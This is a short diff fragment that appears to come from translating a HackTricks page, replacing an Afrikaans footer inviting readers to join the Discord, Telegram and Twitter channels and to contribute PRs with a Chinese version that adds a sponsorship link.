-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
